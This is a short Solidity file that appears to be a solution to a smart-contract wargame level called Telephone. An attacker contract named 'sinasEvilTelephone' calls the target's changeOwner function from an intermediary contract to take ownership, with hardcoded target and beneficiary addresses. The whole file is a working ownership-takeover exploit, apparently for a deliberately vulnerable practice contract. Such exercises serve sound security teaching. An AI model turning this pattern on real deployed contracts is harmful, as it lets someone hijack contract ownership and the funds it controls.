pragma solidity ^0.4.18;

contract Telephone {
  function changeOwner(address _owner) public;
}

contract sinasEvilTelephone{
    address myAddress = 0x9762d1f46e11cf45f257f576449fed9d946baa63;
    address TelephoneContractAddress = 0x9aa92c3164315f40d2f593f08f9e45e8c27ace5c;
    
    Telephone public telephoneContract = Telephone(TelephoneContractAddress);
    function sinasEvilTelephone(){
        telephoneContract.changeOwner(myAddress);
    }
}


